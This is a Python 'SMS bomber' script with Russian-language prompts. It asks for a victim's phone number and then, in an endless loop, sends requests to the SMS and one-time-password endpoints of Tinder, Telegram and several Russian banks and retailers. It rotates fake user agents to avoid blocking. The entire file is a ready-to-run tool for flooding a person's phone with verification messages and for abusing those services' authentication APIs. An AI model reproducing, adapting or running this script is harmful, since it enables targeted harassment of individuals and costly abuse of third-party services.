import requests, fake_useragent, random, datetime, sys, time, argparse, os
from colorama import Fore, Back, Style

banner = """
░██╗░░░░░░░██╗░█████╗░████████╗███████╗░██████╗██████╗░░█████╗░███╗░░░███╗██████╗░
░██║░░██╗░░██║██╔══██╗╚══██╔══╝██╔════╝██╔════╝██╔══██╗██╔══██╗████╗░████║██╔══██╗
░╚██╗████╗██╔╝███████║░░░██║░░░█████╗░░╚█████╗░██████╦╝██║░░██║██╔████╔██║██████╦╝
░░████╔═████║░██╔══██║░░░██║░░░██╔══╝░░░╚═══██╗██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗
░░╚██╔╝░╚██╔╝░██║░░██║░░░██║░░░███████╗██████╔╝██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝
░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═════╝░╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░
"""

print(banner)
def mask(phone: str, mask: str, mask_symbol: str = "*") -> str:
    formatted_phone: str = ""
    for symbol in mask:
        if symbol == mask_symbol:
            formatted_phone += phone[0]
            phone = phone[(len(phone) - 1) * -1:]
        else:
            formatted_phone += symbol
    return formatted_phone
user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
_phone = input('Введите номер для атаки (9xxxxxxxxx)-->> ')

if _phone[0] == '+':
    _phone = _phone[1:]
if _phone[0] == '8':
    _phone = '7'+_phone[1:]
if _phone[0] == '9':
    _phone = '7'+_phone

_name = ''
for x in range(12):
    _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]

iteration = 0
while True:
    _email = _name+f'{iteration}'+'@gmail.com'
    email = _name+f'{iteration}'+'@gmail.com'
    user = fake_useragent.UserAgent().random
    headers = {'user_agent' : user}
    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', headers=headers, data={'phone_number': _phone})
        print('[+] Tinder отправлено!')
    except:
        print('[-] Не отправлено!')
    try:
        requests.post("https://my.telegram.org/auth/send_password", headers=headers, data={"phone": _phone})
        print('[+] telegram отправлено!')
    except:
        print('[-] Не отправлено!')
    try:
        requests.post('https://api.tinkoff.ru/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=RznyziZkeagDbs6SLIr13ZlfSjusxJbQ.m1-prod-api26&wuid=31ad89052c4944fd8cd55bcf419eefc1', headers=headers, data={"phone": _phone})
        print('[+] tinkoff отправлено!')
    except:
        print('[-] Не отправлено!')
    try:
        requests.post('https://sso.mtsbank.ru/api/v2/login', headers=headers, data={"login": _phone})
        print('[+] mtsbank отправлено!')
    except:
        print('[-] Не отправлено!')
    try:
     	requests.post("https://lenta.com/api/v1/authentication/loginotp", headers=headers, json={'phoneNumber': _phone})
     	print('[+] lenta.com отправлено!')
    except:
        print('[-] Не отправлено!')
    try:
         requests.post("https://new.moy.magnit.ru/local/ajax/login/", headers=headers, data={'phone': _phone, 'ksid': 'ee191257-a4fe-4e39-9f0f-079c7f721eee_0'})
         print('[+] magnit отправлено!')
    except:
         print('[-] Не отправлено!')
    try:
         requests.post("https://api.sunlight.net/v3/customers/authorization/", headers=headers, json={'phone': _phone}, cookies={"https://sunlight.net/profile/login/?next_encoded=Lw=="})
         print('[+] sunlight отправлено!')
    except:
         print('[-] Не отправлено!')
    try:
         requests.post("https://www.akbars.ru/api/PhoneConfirm/", headers=headers, json={'phoneNumber': _phone})
         print('[+] akbars.ru отправлено!')
    except:
         print('[-] Не отправлено!')
    try:
         requests.post("https://my.pochtabank.ru/dbo/registrationService/ib/phoneNumber", headers=headers, json={'confirmation': 'send', 'phone': _phone})
         print('[+] pochtabank.ru отправлено!')
    except:
         print('[-] Не отправлено!')
